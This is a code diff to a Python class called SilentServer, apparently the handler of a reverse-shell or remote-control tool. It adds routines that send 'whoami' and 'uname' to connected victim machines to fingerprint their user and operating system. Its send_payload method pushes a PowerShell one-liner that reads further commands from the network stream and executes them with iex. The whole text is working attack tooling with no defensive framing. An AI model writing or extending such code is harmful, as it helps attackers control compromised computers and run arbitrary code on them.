@@ -121,7 +121,10 @@ class SilentServer:
 
                         self.clients.append(client_struct)
                         core.TextAssets.print_client(client_struct)
-                        
+
+                        self.client_id        = None
+                        self.client_os        = None
+                        self.client_user      = None
 
         def shutdown(self) -> None:
                 self.listener.close()
@@ -139,40 +142,85 @@ class SilentServer:
 
         def verify_client(self) -> bool:
                 self.client_id          = self.get_client_id()
-                
+
                 if not self.wait_client():
                         if not self.send_payload():
                                 return False
 
-                return self.verify_data()
+                if not self.verify_username():
+                        return False
 
-        def verify_data(self) -> bool:
+                if not self.client_user:
+                        return False
+
+                if self.client_os:
+                        return True
+
+                if not self.verify_os():
+                        return False
+
+                if not self.client_os:
+                        return False
+
+                return True
+
+        def verify_username(self) -> bool:
                 self.client.send("whoami\n".encode())
                 data                    = self.wait_client().decode()
 
                 if not data:
                         return False
 
-                data                    = data.split("\n")[1]
+                if "\n" in data:
+                        data            = data.split("\n")
+
+                if data[0] == "whoami":
+                        data            = data[1:]
+
+                if not isinstance(data, list):
+                        data            = [data]
+
+                for potential_data in data:
+                        if potential_data.strip("\r"):
+                                data    = potential_data.strip("\r")
+                                break
 
                 if "\\" in data:
-                        os              = "Windows"
-                        user            = data.split("\\")[1][:-1]
-                
+                        self.client_os  = "Windows"
+                        user            = data.split("\\")[1]
+
                 else:
-                        self.client.send("uname\n".encode())
-                        os              = self.wait_client()
-
-                        if not os:
-                                return False
-
-                        os              = os.decode()
                         user            = data
 
-                self.client_os          = os
                 self.client_user        = user
 
                 return True
+
+        def verify_os(self) -> bool:
+                self.client.send("uname\n".encode())
+                data                    = self.wait_client().decode()
+
+                if not data:
+                        return False
+
+                if "\n" in data:
+                        data            = data.split("\n")
+
+                if data[0] == "uname":
+                        data            = data[1:]
+
+                if not isinstance(data, list):
+                        data            = [data]
+
+                for potential_data in data:
+                        if potential_data.strip("\r"):
+                                data    = potential_data.strip("\r")
+                                break
+
+                self.client_os          = data
+
+                return True
+
 
         def send_payload(self) -> bool:
                 self.client.send(f"$w=[io.streamwriter]::new($t.getstream());$w.write('{self.client_id}');$w.flush();[io.streamreader]::new($t.getstream()).readline()|iex\n".encode())
